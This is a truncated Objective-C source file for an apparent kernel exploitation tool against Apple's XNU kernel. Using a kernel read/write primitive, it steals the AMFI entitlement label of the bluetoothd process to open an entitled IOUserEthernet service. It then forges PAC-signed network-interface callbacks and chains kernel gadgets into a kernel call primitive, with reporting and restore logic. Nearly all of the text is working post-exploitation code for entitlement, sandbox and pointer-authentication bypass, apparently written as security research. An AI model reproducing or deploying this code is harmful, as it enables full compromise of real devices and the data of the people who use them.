static bool CNDRestoreNotificationBlock(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->blockInstalled) return false;
    /* Restore the stock action first so a zero refcon cannot reach block ABI. */
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        int actionResult = CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierActionOffset,
            swap->notifierA.rawAction);
        int refResult = actionResult == 0
            ? CNDWriteAndVerifyU64(fd,
                swap->notifierA.notifier + CNDNotifierRefOffset,
                swap->notifierA.ref)
            : actionResult;
        if (actionResult == 0 && refResult == 0) {
            swap->blockInstalled = false;
            swap->blockRestored = true;
            return true;
        }
    }
    return false;
}

static int CNDInstallNotificationSandboxBridge(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->ready || swap->sandboxInstalled ||
        swap->sandboxActionDonorCount == 0 ||
        swap->sandboxActionDonor.rawTarget == 0) {
        return EINVAL;
    }
    /*
     * The stock action does not authenticate the target as IA-zero.  Publish
     * the signed callback first, then expose it by installing the Sandbox
     * IA/0x61de bridge.  Recovery and normal restore reverse that order.
     */
    int result = CNDWriteAndVerifyU64(fd,
        swap->notifierA.notifier + CNDNotifierTargetOffset,
        swap->sandboxActionDonor.rawTarget);
    if (result == 0) {
        result = CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierActionOffset,
            swap->sandboxActionDonor.rawAction);
    }
    if (result != 0) {
        (void)CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierActionOffset,
            swap->notifierA.rawAction);
        (void)CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierTargetOffset,
            swap->notifierA.rawTarget);
        return result;
    }
    swap->sandboxInstalled = true;
    return 0;
}

static bool CNDRestoreNotificationSandboxBridge(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->sandboxInstalled) return false;
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        int actionResult = CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierActionOffset,
            swap->notifierA.rawAction);
        int targetResult = actionResult == 0
            ? CNDWriteAndVerifyU64(fd,
                swap->notifierA.notifier + CNDNotifierTargetOffset,
                swap->notifierA.rawTarget)
            : actionResult;
        if (actionResult == 0 && targetResult == 0) {
            swap->sandboxInstalled = false;
            swap->sandboxRestored = true;
            return true;
        }
    }
    return false;
}

static NSArray<NSDictionary<NSString *, id> *> *CNDInterfaces(
    int fd, uint64_t ipcTable)
{
    NSMutableArray<NSDictionary<NSString *, id> *> *result =
        [NSMutableArray array];
    CFMutableDictionaryRef matching =
        IOServiceMatching("IOUserEthernetInterface");
    io_iterator_t iterator = IO_OBJECT_NULL;
    kern_return_t kr = matching != NULL
        ? IOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iterator)
        : KERN_RESOURCE_SHORTAGE;
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(iterator)) return result;

    for (;;) {
        io_service_t service = IOIteratorNext(iterator);
        if (!MACH_PORT_VALID(service)) break;
        uint64_t registryID = 0;
        (void)IORegistryEntryGetRegistryEntryID(service, &registryID);
        CFTypeRef bsdName = IORegistryEntryCreateCFProperty(
            service, CFSTR("BSD Name"), kCFAllocatorDefault, 0);
        io_string_t path = {0};
        kern_return_t pathKR = IORegistryEntryGetPath(
            service, kIOServicePlane, path);
        NSMutableDictionary<NSString *, id> *entry =
            [NSMutableDictionary dictionaryWithDictionary:@{
                @"registryID": CNDHex(registryID),
                @"machPort": CNDHex(service),
                @"path": pathKR == KERN_SUCCESS
                    ? [NSString stringWithUTF8String:path] : @"",
            }];
        uint64_t wrapper = 0;
        uint64_t object = CNDIOObjectForPort(
            fd, ipcTable, service, &wrapper);
        uint64_t rawVtable = 0;
        uint64_t vtable = 0;
        if (CNDKernelObject(object) &&
            CNDKernelRead(fd, object, &rawVtable,
                sizeof(rawVtable)) == 0) {
            vtable = CNDStripDataPointer(rawVtable);
        }
        entry[@"kernelWrapper"] = CNDHex(wrapper);
        entry[@"kernelObject"] = CNDHex(object);
        entry[@"kernelObjectVtable"] = CNDHex(vtable);
        if (bsdName != NULL) {
            if (CFGetTypeID(bsdName) == CFStringGetTypeID()) {
                entry[@"bsdName"] = (__bridge NSString *)bsdName;
            }
            CFRelease(bsdName);
        }
        [result addObject:entry];
        IOObjectRelease(service);
    }
    IOObjectRelease(iterator);
    return result;
}

static bool CNDRestoreU64(int fd, uint64_t address, uint64_t original)
{
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDWriteAndVerifyU64(fd, address, original) == 0) return true;
    }
    return false;
}

static void CNDReportSignedIfnet(
    NSMutableDictionary<NSString *, id> *report, NSString *prefix,
    const CNDIfnetSignedInterface *value)
{
    if (report == nil || prefix == nil || value == NULL) return;
    report[[prefix stringByAppendingString:@"BSDName"]] =
        value->bsdName[0] != '\0'
            ? [NSString stringWithUTF8String:value->bsdName] : @"";
    report[[prefix stringByAppendingString:@"RegistryID"]] =
        CNDHex(value->registryID);
    report[[prefix stringByAppendingString:@"InterfaceObject"]] =
        CNDHex(value->interfaceObject);
    report[[prefix stringByAppendingString:@"BackingIfnet"]] =
        CNDHex(value->backingIfnet);
    report[[prefix stringByAppendingString:@"SignedCallback"]] =
        CNDHex(value->signedCallback);
    report[[prefix stringByAppendingString:@"CallbackTarget"]] =
        CNDHex(value->callbackTarget);
    report[[prefix stringByAppendingString:@"ControllerCookie"]] =
        CNDHex(value->controllerCookie);
    report[[prefix stringByAppendingString:@"CallKR"]] =
        CNDHex((uint32_t)value->callKR);
    report[[prefix stringByAppendingString:@"ReadbackResult"]] =
        @(value->readbackResult);
}

static int CNDCreateSignedIfnet(int fd, io_connect_t connection,
    uint64_t ipcTable, NSMutableSet<NSString *> *knownIDs,
    CNDIfnetPACCanary *signer, uint64_t chosenTarget, uint8_t stage,
    CNDIfnetSignedInterface *created, NSArray **latestInterfaces,
    bool *criticalRestoreFailure)
{
    if (!MACH_PORT_VALID(connection) || knownIDs == nil || signer == NULL ||
        !signer->ready || !CNDKernelVirtualAddress(chosenTarget) ||
        created == NULL) return EINVAL;
    *created = (CNDIfnetSignedInterface){
        .callKR = KERN_FAILURE,
        .readbackResult = ENOENT,
    };
    signer->canaryTarget = chosenTarget;
    signer->restored = false;
    int installResult = CNDInstallIfnetPACCanary(fd, signer);
    if (installResult != 0) {
        bool restored = CNDRestoreIfnetPACCanary(fd, signer);
        if (!restored && criticalRestoreFailure != NULL) {
            *criticalRestoreFailure = true;
        }
        return installResult;
    }

    uint32_t pid = (uint32_t)getpid();
    uint8_t mac[6] = {
        0x02, 0xc1, stage, 0x26,
        (uint8_t)(pid >> 8), (uint8_t)pid,
    };
    NSDictionary *properties = @{
        @"HardwareAddress": [NSData dataWithBytes:mac length:6],
        @"MinPacketSize": @64,
        @"MaxPacketSize": @1514,
        @"MaxTransferUnit": @1500,
        @"NamePrefix": @"kcl",
    };
    CFDataRef serialized = IOCFSerialize(
        (__bridge CFTypeRef)properties, kIOCFSerializeToBinary);
    if (serialized == NULL) {
        bool restored = CNDRestoreIfnetPACCanary(fd, signer);
        if (!restored && criticalRestoreFailure != NULL) {
            *criticalRestoreFailure = true;
        }
        return ENOMEM;
    }

    uint32_t scalarOutputCount = 1;
    created->callKR = IOConnectCallMethod(connection, 0, NULL, 0,
        CFDataGetBytePtr(serialized), (size_t)CFDataGetLength(serialized),
        &created->controllerCookie, &scalarOutputCount, NULL, NULL);
    CFRelease(serialized);

    unsigned int polls = created->callKR == KERN_SUCCESS ? 60 : 1;
    for (unsigned int attempt = 0; attempt < polls; attempt++) {
        NSArray *snapshot = CNDInterfaces(fd, ipcTable);
        if (latestInterfaces != NULL) *latestInterfaces = snapshot;
        for (NSDictionary *entry in snapshot) {
            NSString *identifier = entry[@"registryID"];
            NSString *name = entry[@"bsdName"];
            if (![identifier isKindOfClass:[NSString class]] ||
                [knownIDs containsObject:identifier] ||
                ![name isKindOfClass:[NSString class]] || name.length == 0) {
                continue;
            }
            NSString *object = entry[@"kernelObject"];
            if (!CNDParseU64(identifier.UTF8String, &created->registryID) ||
                ![object isKindOfClass:[NSString class]] ||
                !CNDParseU64(object.UTF8String,
                    &created->interfaceObject)) continue;
            strlcpy(created->bsdName, name.UTF8String,
                sizeof(created->bsdName));
            [knownIDs addObject:identifier];
            break;
        }
        if (created->bsdName[0] != '\0' || attempt + 1 == polls) break;
        usleep(50000);
    }

    bool gotRestored = CNDRestoreIfnetPACCanary(fd, signer);
    if (!gotRestored && criticalRestoreFailure != NULL) {
        *criticalRestoreFailure = true;
    }
    if (!gotRestored) return EIO;
    if (created->callKR != KERN_SUCCESS) return (int)created->callKR;
    if (created->bsdName[0] == '\0' ||
        !CNDKernelObject(created->interfaceObject)) return ENOENT;

    uint64_t rawBackingIfnet = 0;
    created->readbackResult = CNDKernelRead(fd,
        created->interfaceObject + CNDIONetworkInterfaceBackingIfnetOffset,
        &rawBackingIfnet, sizeof(rawBackingIfnet));
    created->backingIfnet = CNDStripDataPointer(rawBackingIfnet);
    if (created->readbackResult == 0 &&
        CNDKernelObject(created->backingIfnet)) {
        created->readbackResult = CNDKernelRead(fd,
            created->backingIfnet + CNDIfnetCheckMultiOffset,
            &created->signedCallback, sizeof(created->signedCallback));
    } else if (created->readbackResult == 0) {
        created->readbackResult = EILSEQ;
    }
    created->callbackTarget = CNDStripInstructionPointer(
        created->signedCallback);
    if (created->readbackResult == 0 &&
        created->callbackTarget != chosenTarget) {
        created->readbackResult = EILSEQ;
    }
    return created->readbackResult;
}

static int CNDRunIfnetKCall1PACCanary(int fd, uint64_t slide,
    io_connect_t connection, uint64_t ipcTable,
    NSMutableSet<NSString *> *knownIDs,
    NSMutableDictionary<NSString *, id> *report, NSArray **after,
    kern_return_t *lastCallKR, uint64_t *lastControllerCookie,
    bool *criticalRestoreFailure)
{
    if (report == nil || after == NULL || lastCallKR == NULL ||
        lastControllerCookie == NULL || criticalRestoreFailure == NULL) {
        return EINVAL;
    }
    CNDIfnetPACCanary signer = {0};
    int result = CNDPrepareIfnetPACCanary(fd, slide, &signer, report);
    uint64_t stockTarget = CNDStaticEtherCheckMulti + slide;
    uint64_t loadTarget = CNDStaticLoadW0FromX0 + slide;
    uint64_t dispatcherTarget = CNDStaticIfnetX0Dispatcher + slide;
    uint32_t loadInstructions[3] = {0};
    uint32_t dispatcherInstructions[7] = {0};
    if (result == 0) {
        result = CNDKernelRead(fd, loadTarget, loadInstructions,
            sizeof(loadInstructions));
    }
    if (result == 0) {
        result = CNDKernelRead(fd, dispatcherTarget,
            dispatcherInstructions, sizeof(dispatcherInstructions));
    }
    const uint32_t expectedLoad[3] = {
        UINT32_C(0xd503245f), UINT32_C(0xb9400000),
        UINT32_C(0xd65f03c0),
    };
    const uint32_t expectedDispatcher[7] = {
        UINT32_C(0xd503245f), UINT32_C(0xf9405810),
        UINT32_C(0xb4000090), UINT32_C(0xf9404800),
        UINT32_C(0xd29c9fd1), UINT32_C(0xd71f0a11),
        UINT32_C(0xd65f03c0),
    };
    if (result == 0 &&
        (memcmp(loadInstructions, expectedLoad, sizeof(expectedLoad)) != 0 ||
         memcmp(dispatcherInstructions, expectedDispatcher,
            sizeof(expectedDispatcher)) != 0)) {
        result = EILSEQ;
    }
    report[@"ifnetKCall1SetupResult"] = @(result);
    report[@"ifnetKCall1StockTarget"] = CNDHex(stockTarget);
    report[@"ifnetKCall1LoadTarget"] = CNDHex(loadTarget);
    report[@"ifnetKCall1DispatcherTarget"] = CNDHex(dispatcherTarget);
    report[@"ifnetKCall1MarkerAddress"] = CNDHex(signer.gotAddress);
    report[@"ifnetKCall1MarkerValue"] = @(EINPROGRESS);
    report[@"ifnetKCall1ConstructedArity"] = @1;
    report[@"ifnetKCall1ProviderKCallUsed"] = @NO;
    if (result != 0) return result;

    CNDIfnetSignedInterface stock = {0};
    CNDIfnetSignedInterface load = {0};
    CNDIfnetSignedInterface dispatcher = {0};
    result = CNDCreateSignedIfnet(fd, connection, ipcTable, knownIDs,
        &signer, stockTarget, 0x51, &stock, after,
        criticalRestoreFailure);
    if (result == 0) {
        result = CNDCreateSignedIfnet(fd, connection, ipcTable, knownIDs,
            &signer, loadTarget, 0x52, &load, after,
            criticalRestoreFailure);
    }
    if (result == 0) {
        result = CNDCreateSignedIfnet(fd, connection, ipcTable, knownIDs,
            &signer, dispatcherTarget, 0x53, &dispatcher, after,
            criticalRestoreFailure);
    }
    CNDReportSignedIfnet(report, @"ifnetKCall1Stock", &stock);
    CNDReportSignedIfnet(report, @"ifnetKCall1Load", &load);
    CNDReportSignedIfnet(report, @"ifnetKCall1Dispatcher", &dispatcher);
    *lastCallKR = dispatcher.callKR;
    *lastControllerCookie = dispatcher.controllerCookie;
    report[@"ifnetKCall1SignerStagesResult"] = @(result);
    if (result != 0) {
        bool safe = true;
        if (stock.signedCallback != 0 &&
            CNDKernelObject(load.backingIfnet)) {
            safe = CNDRestoreU64(fd,
                load.backingIfnet + CNDIfnetCheckMultiOffset,
                stock.signedCallback) && safe;
        }
        if (stock.signedCallback != 0 &&
            CNDKernelObject(dispatcher.backingIfnet)) {
            safe = CNDRestoreU64(fd,
                dispatcher.backingIfnet + CNDIfnetCheckMultiOffset,
                stock.signedCallback) && safe;
        }
        report[@"ifnetKCall1FailedStageSanitized"] = @(safe);
        if (!safe) *criticalRestoreFailure = true;
        return result;
    }

    uint64_t fieldX0 = dispatcher.backingIfnet + 0x90;
    uint64_t fieldTarget = dispatcher.backingIfnet + 0xb0;
    uint64_t fieldCallback =
        dispatcher.backingIfnet + CNDIfnetCheckMultiOffset;
    bool callbackQuiesced = CNDWriteAndVerifyU64(fd, fieldCallback,
        stock.signedCallback) == 0;
    uint64_t originalX0 = 0;
    uint64_t originalTarget = 0;
    result = callbackQuiesced
        ? CNDKernelRead(fd, fieldX0, &originalX0, sizeof(originalX0))
        : EIO;
    if (result == 0) {
        result = CNDKernelRead(fd, fieldTarget, &originalTarget,
            sizeof(originalTarget));
    }
    report[@"ifnetKCall1X0Field"] = CNDHex(fieldX0);
    report[@"ifnetKCall1TargetField"] = CNDHex(fieldTarget);
    report[@"ifnetKCall1CallbackField"] = CNDHex(fieldCallback);
    report[@"ifnetKCall1OriginalX0"] = CNDHex(originalX0);
    report[@"ifnetKCall1OriginalTarget"] = CNDHex(originalTarget);

    bool gotChanged = false;
    bool targetChanged = false;
    bool x0Changed = false;
    bool callbackExposed = false;
    if (result == 0) {
        result = CNDWriteAndVerifyU64(fd, signer.gotAddress,
            (uint64_t)EINPROGRESS);
        gotChanged = result == 0;
    }
    if (result == 0) {
        result = CNDWriteAndVerifyU64(fd, fieldTarget,
            load.signedCallback);
        targetChanged = result == 0;
    }
    if (result == 0) {
        result = CNDWriteAndVerifyU64(fd, fieldX0, signer.gotAddress);
        x0Changed = result == 0;
    }
    if (result == 0) {
        result = CNDWriteAndVerifyU64(fd, fieldCallback,
            dispatcher.signedCallback);
        callbackExposed = result == 0;
    }
    report[@"ifnetKCall1CallbackQuiesced"] = @(callbackQuiesced);
    report[@"ifnetKCall1ChainInstalled"] = @(callbackExposed);

    int triggerResult = -1;
    int triggerErrno = 0;
    int cleanupResult = -1;
    int cleanupErrno = 0;
    if (result == 0) {
        CNDTriggerIfnetCheckMulti(
            [NSString stringWithUTF8String:dispatcher.bsdName],
            &triggerResult, &triggerErrno,
            &cleanupResult, &cleanupErrno);
    }

    bool callbackSanitized = callbackQuiesced &&
        CNDRestoreU64(fd, fieldCallback, stock.signedCallback);
    bool targetRestored = !targetChanged ||
        CNDRestoreU64(fd, fieldTarget, originalTarget);
    bool x0Restored = !x0Changed ||
        CNDRestoreU64(fd, fieldX0, originalX0);
    bool gotRestored = !gotChanged ||
        CNDRestoreU64(fd, signer.gotAddress, signer.originalRaw);
    if (!callbackSanitized || !targetRestored || !x0Restored ||
        !gotRestored) {
        *criticalRestoreFailure = true;
    }
    uint64_t finalCallback = 0;
    uint64_t finalX0 = 0;
    uint64_t finalTarget = 0;
    uint64_t finalGOT = 0;
    int finalReadResult = CNDKernelRead(fd, fieldCallback,
        &finalCallback, sizeof(finalCallback));
    if (finalReadResult == 0) {
        finalReadResult = CNDKernelRead(fd, fieldX0,
            &finalX0, sizeof(finalX0));
    }
    if (finalReadResult == 0) {
        finalReadResult = CNDKernelRead(fd, fieldTarget,
            &finalTarget, sizeof(finalTarget));
    }
    if (finalReadResult == 0) {
        finalReadResult = CNDKernelRead(fd, signer.gotAddress,
            &finalGOT, sizeof(finalGOT));
    }

    report[@"ifnetKCall1TriggerResult"] = @(triggerResult);
    report[@"ifnetKCall1TriggerErrno"] = @(triggerErrno);
    report[@"ifnetKCall1TriggerErrnoName"] =
        triggerErrno == EINPROGRESS ? @"EINPROGRESS" : @"";
    report[@"ifnetKCall1CleanupResult"] = @(cleanupResult);
    report[@"ifnetKCall1CleanupErrno"] = @(cleanupErrno);
    report[@"ifnetKCall1CallbackSanitized"] = @(callbackSanitized);
    report[@"ifnetKCall1X0Restored"] = @(x0Restored);
    report[@"ifnetKCall1TargetRestored"] = @(targetRestored);
    report[@"ifnetKCall1GOTRestored"] = @(gotRestored);
    report[@"ifnetKCall1FinalReadResult"] = @(finalReadResult);
    report[@"ifnetKCall1FinalCallback"] = CNDHex(finalCallback);
    report[@"ifnetKCall1FinalCallbackTarget"] = CNDHex(
        CNDStripInstructionPointer(finalCallback));
    report[@"ifnetKCall1FinalX0"] = CNDHex(finalX0);
    report[@"ifnetKCall1FinalTarget"] = CNDHex(finalTarget);
    report[@"ifnetKCall1FinalGOT"] = CNDHex(finalGOT);

    bool success = result == 0 && triggerResult == -1 &&
        triggerErrno == EINPROGRESS && callbackSanitized &&
        targetRestored && x0Restored && gotRestored &&
        finalReadResult == 0 && finalCallback == stock.signedCallback &&
        finalX0 == originalX0 && finalTarget == originalTarget &&
        finalGOT == signer.originalRaw;
    report[@"ifnetKCall1Success"] = @(success);
    return success ? 0 : (result != 0 ? result : EIO);
}

static void CNDPrintReport(NSDictionary<NSString *, id> *report)
{
    NSData *json = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingSortedKeys error:nil];
    if (json != nil) {
        fwrite(json.bytes, 1, json.length, stdout);
        fputc('\n', stdout);
        fflush(stdout);
    }
}

int main(int argc, const char *argv[])
{
    @autoreleasepool {
        CNDOptions options = {0};
        uint64_t debuggerLoadAddress = 0;
        uint64_t donorPIDValue = 0;
        if (!CNDParseOptions(argc, argv, &options) || !CNDParseU64(
                argc > 2 ? argv[2] : NULL, &debuggerLoadAddress) ||
            !CNDParseU64(argc > 3 ? argv[3] : NULL, &donorPIDValue) ||
            donorPIDValue <= 1 || donorPIDValue > INT32_MAX ||
            debuggerLoadAddress < CNDStaticKernelBase) {
            fprintf(stderr, "usage: cnd_iouserethernet_krw_trigger "
                "SOCKET EXPECTED_BASE BLUETOOTHD_PID "
                "[--notification-target-swap | "
                "--notification-block-canary | "
                "--notification-sandbox-canary | "
                "--notification-2abe-73d8-canary | "
                "--ifnet-check-multi-pac-canary | "
                "--ifnet-kcall1-pac-canary | "
                "--sysctl-pac-census] [--hold SECONDS]\n");
            return 64;
        }

        NSMutableDictionary<NSString *, id> *report =
            [NSMutableDictionary dictionaryWithDictionary:@{
                @"schema": @"com.zeroxjf.cyanide.iouserethernet-krw-trigger",
                @"schemaVersion": @1,
                @"build": @"23A341",
                @"donorExecutable": @"/usr/sbin/bluetoothd",
                @"requiredEntitlement":
                    @"com.apple.networking.ethernet.user-access",
                @"kernelReadUsed": @YES,
                @"kernelWriteUsed": @NO,
                @"kernelCallUsed": @NO,
                @"providerOperations": @[
                    @"Capabilities", @"KBase", @"Read", @"Write"
                ],
                @"labelWriteScope":
                    @"self MAC label base, exactly 0x20 bytes",
                @"selectorInvokedAfterRestore": @NO,
                @"holdSeconds": @(options.holdSeconds),
                @"notificationTargetSwapRequested":
                    @(options.notificationTargetSwap),
                @"notificationBlockCanaryRequested":
                    @(options.notificationBlockCanary),
                @"notificationSandboxCanaryRequested":
                    @(options.notificationSandboxCanary),
                @"notification2ABE73D8CanaryRequested":
                    @(options.notification2ABE73D8Canary),
                @"ifnetCheckMultiPACCanaryRequested":
                    @(options.ifnetCheckMultiPACCanary),
                @"ifnetKCall1PACCanaryRequested":
                    @(options.ifnetKCall1PACCanary),
                @"sysctlPACCensusRequested":
                    @(options.sysctlPACCensus),
                @"notificationTargetSwapReady": @NO,
                @"notificationTargetInstalled": @NO,
                @"notificationTargetRestored": @NO,
                @"notificationBlockInstalled": @NO,
                @"notificationBlockRestored": @NO,
                @"notificationSandboxInstalled": @NO,
                @"notificationSandboxRestored": @NO,
                @"notification2ABE73D8Prepared": @NO,
                @"notification2ABE73D8Installed": @NO,
                @"notification2ABE73D8Restored": @NO,
                @"ifnetPACGOTReady": @NO,
                @"ifnetPACGOTInstalled": @NO,
                @"ifnetPACGOTRestored": @NO,
                @"ifnetKCall1Success": @NO,
            }];
        int fd = CNDConnectProvider(argv[1]);
        if (fd < 0) {
            report[@"result"] = @"provider-connect-failed";
            report[@"errno"] = @(errno);
            CNDPrintReport(report);
            return 1;
        }

        uint64_t capabilities = 0;
        uint64_t observedBase = 0;
        int result = CNDRequest(fd, CNDLabKRWOperationCapabilities,
            0, NULL, 0, &capabilities);
        if (result == 0) {
            result = CNDRequest(fd, CNDLabKRWOperationKBase,
                0, NULL, 0, &observedBase);
        }
        report[@"providerCapabilities"] = CNDHex(capabilities);
        report[@"debuggerLoadAddress"] = CNDHex(debuggerLoadAddress);
        report[@"observedKernelBase"] = CNDHex(observedBase);
        struct mach_header_64 filesetHeader = {0};
        struct mach_header_64 debuggerHeader = {0};
        if (result == 0) {
            result = CNDKernelRead(fd, observedBase,
                &filesetHeader, sizeof(filesetHeader));
        }
        if (result == 0) {
            result = CNDKernelRead(fd, debuggerLoadAddress,
                &debuggerHeader, sizeof(debuggerHeader));
        }
        bool matchingBootLayout = observedBase == debuggerLoadAddress ||
            (observedBase <= UINT64_MAX - UINT64_C(0x4000) &&
             observedBase + UINT64_C(0x4000) == debuggerLoadAddress);
        report[@"providerHeaderFiletype"] = @(filesetHeader.filetype);
        report[@"debuggerHeaderFiletype"] = @(debuggerHeader.filetype);
        if (result != 0 || !matchingBootLayout ||
            filesetHeader.magic != MH_MAGIC_64 ||
            filesetHeader.filetype != MH_FILESET ||
            debuggerHeader.magic != MH_MAGIC_64 ||
            (debuggerLoadAddress != observedBase &&
             debuggerHeader.filetype != MH_EXECUTE) ||
            (capabilities & CNDLabKRWCapabilityKernelReadWrite) == 0) {
            report[@"result"] = @"provider-identity-failed";
            report[@"providerResult"] = @(result);
            CNDPrintReport(report);
            close(fd);
            return 1;
        }

        uint64_t slide = observedBase - CNDStaticKernelBase;
        report[@"kernelSlide"] = CNDHex(slide);
        if (slide >= UINT64_C(0x100000000)) {
            report[@"result"] = @"kernel-slide-refused";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }

        if (options.sysctlPACCensus) {
            result = CNDRunSysctlPACCensus(fd, slide, report);
            CNDPrintReport(report);
            close(fd);
            return result == 0 ? 0 : 1;
        }

        uint64_t allProcHead = 0;
        result = CNDKernelRead(fd, CNDStaticAllProc + slide,
            &allProcHead, sizeof(allProcHead));
        uint32_t selfVisited = 0;
        uint32_t donorVisited = 0;
        uint64_t selfProc = result == 0 ? CNDFindProcess(
            fd, allProcHead, (uint32_t)getpid(), &selfVisited) : 0;
        uint64_t donorProc = result == 0 ? CNDFindProcess(
            fd, allProcHead, (uint32_t)donorPIDValue, &donorVisited) : 0;
        report[@"selfPID"] = @(getpid());
        report[@"donorPID"] = @(donorPIDValue);
        report[@"selfProc"] = CNDHex(selfProc);
        report[@"donorProc"] = CNDHex(donorProc);
        report[@"selfProcWalkCount"] = @(selfVisited);
        report[@"donorProcWalkCount"] = @(donorVisited);
        if (!CNDKernelObject(selfProc) || !CNDKernelObject(donorProc) ||
            selfProc == donorProc ||
            !CNDProcessNameIs(fd, donorProc, "bluetoothd")) {
            report[@"result"] = @"process-identity-refused";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }

        uint64_t selfTaskForServices = CNDProcessTask(fd, selfProc);
        uint64_t selfIPCTableForServices = CNDTaskIPCTable(
            fd, selfTaskForServices);
        report[@"selfTaskForServices"] = CNDHex(selfTaskForServices);
        report[@"selfIPCTableForServices"] =
            CNDHex(selfIPCTableForServices);
        if (!CNDKernelObject(selfTaskForServices) ||
            !CNDKernelObject(selfIPCTableForServices)) {
            report[@"result"] = @"service-ipc-table-resolution-refused";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }
        NSArray *before = CNDInterfaces(fd, selfIPCTableForServices);
        NSMutableSet<NSString *> *beforeIDs = [NSMutableSet set];
        for (NSDictionary *entry in before) {
            NSString *identifier = entry[@"registryID"];
            if (identifier != nil) [beforeIDs addObject:identifier];
        }
        io_service_t resource = IOServiceGetMatchingService(
            MACH_PORT_NULL, IOServiceMatching("IOUserEthernetResource"));
        io_connect_t baselineConnection = IO_OBJECT_NULL;
        kern_return_t baselineOpenKR = MACH_PORT_VALID(resource)
            ? IOServiceOpen(resource, mach_task_self(), 0,
                &baselineConnection)
            : KERN_NOT_FOUND;
        if (MACH_PORT_VALID(baselineConnection)) {
            IOServiceClose(baselineConnection);
        }
        report[@"baselineOpenKR"] = CNDHex((uint32_t)baselineOpenKR);
        if (!MACH_PORT_VALID(resource) || baselineOpenKR == KERN_SUCCESS) {
            if (MACH_PORT_VALID(resource)) IOObjectRelease(resource);
            report[@"result"] = baselineOpenKR == KERN_SUCCESS
                ? @"baseline-unexpectedly-authorized"
                : @"resource-missing";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }

        /*
         * Resolve the label only after the negative entitlement check. AMFI
         * can replace a process credential/label while materializing its
         * entitlement state; retaining the pre-check pointer would turn the
         * subsequent write into a guarded-zone use-after-free.
         */
        uint32_t postBaselineSelfVisited = 0;
        uint32_t postBaselineDonorVisited = 0;
        uint64_t postBaselineSelfProc = CNDFindProcess(
            fd, allProcHead, (uint32_t)getpid(), &postBaselineSelfVisited);
        uint64_t postBaselineDonorProc = CNDFindProcess(
            fd, allProcHead, (uint32_t)donorPIDValue,
            &postBaselineDonorVisited);
        if (postBaselineSelfProc != selfProc ||
            postBaselineDonorProc != donorProc ||
            !CNDProcessNameIs(fd, donorProc, "bluetoothd")) {
            IOObjectRelease(resource);
            report[@"result"] = @"post-baseline-process-identity-refused";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }

        uint64_t selfLabel = 0;
        uint64_t donorLabel = 0;
        if (CNDProcessLabel(fd, selfProc, &selfLabel) != 0 ||
            CNDProcessLabel(fd, donorProc, &donorLabel) != 0 ||
            selfLabel == donorLabel) {
            IOObjectRelease(resource);
            report[@"result"] = @"label-resolution-refused";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }
        report[@"labelResolvedAfterBaseline"] = @YES;
        report[@"selfLabel"] = CNDHex(selfLabel);
        report[@"donorLabel"] = CNDHex(donorLabel);

        uint8_t originalLabel[CNDMACLabelSize] = {0};
        uint8_t donorLabelBytes[CNDMACLabelSize] = {0};
        result = CNDKernelRead(fd, selfLabel,
            originalLabel, sizeof(originalLabel));
        if (result == 0) {
            result = CNDKernelRead(fd, donorLabel,
                donorLabelBytes, sizeof(donorLabelBytes));
        }
        uint64_t originalAMFIObject = 0;
        uint64_t donorAMFIObject = 0;
        memcpy(&originalAMFIObject,
            originalLabel + CNDAMFISlotOffset, sizeof(originalAMFIObject));
        memcpy(&donorAMFIObject,
            donorLabelBytes + CNDAMFISlotOffset, sizeof(donorAMFIObject));
        report[@"originalAMFIObject"] = CNDHex(originalAMFIObject);
        report[@"donorAMFIObject"] = CNDHex(donorAMFIObject);
        if (result != 0 || originalAMFIObject == donorAMFIObject ||
            !CNDKernelObject(CNDStripDataPointer(originalAMFIObject)) ||
            !CNDKernelObject(CNDStripDataPointer(donorAMFIObject))) {
            IOObjectRelease(resource);
            report[@"result"] = @"amfi-object-shape-refused";
            CNDPrintReport(report);
            close(fd);
            return 1;
        }

        uint8_t borrowedLabel[CNDMACLabelSize] = {0};
        memcpy(borrowedLabel, originalLabel, sizeof(borrowedLabel));
        memcpy(borrowedLabel + CNDAMFISlotOffset,
            &donorAMFIObject, sizeof(donorAMFIObject));
        uint32_t writeCount = 0;
        bool installed = CNDWriteAndVerifyLabel(fd, selfLabel,
            borrowedLabel, &writeCount) == 0;
        report[@"kernelWriteUsed"] = @YES;
        report[@"borrowInstalled"] = @(installed);

        io_connect_t connection = IO_OBJECT_NULL;
        kern_return_t borrowedOpenKR = installed
            ? IOServiceOpen(resource, mach_task_self(), 0, &connection)
            : KERN_FAILURE;
        bool restored = CNDRestoreLabel(fd, selfLabel,
            originalLabel, &writeCount);
        report[@"borrowedOpenKR"] = CNDHex((uint32_t)borrowedOpenKR);
        report[@"borrowRestored"] = @(restored);
        report[@"restoreWholeLabelExact"] = @(restored);
        report[@"labelWriteCount"] = @(writeCount);
        IOObjectRelease(resource);
        if (!restored) {
            if (MACH_PORT_VALID(connection)) IOServiceClose(connection);
            report[@"result"] = @"critical-label-restore-failed";
            CNDPrintReport(report);
            close(fd);
            return 2;
        }

        CNDNotificationSwap notificationSwap = {0};
        int notificationSetupResult = 0;
        bool notificationMutationRequested =
            options.notificationTargetSwap ||
            options.notificationBlockCanary ||
            options.notificationSandboxCanary ||
            options.notification2ABE73D8Canary;
        if (notificationMutationRequested &&
            borrowedOpenKR == KERN_SUCCESS &&
            MACH_PORT_VALID(connection)) {
            notificationSetupResult = CNDPrepareNotificationSwap(
                fd, slide, selfProc,
                options.notificationBlockCanary ||
                    options.notification2ABE73D8Canary,
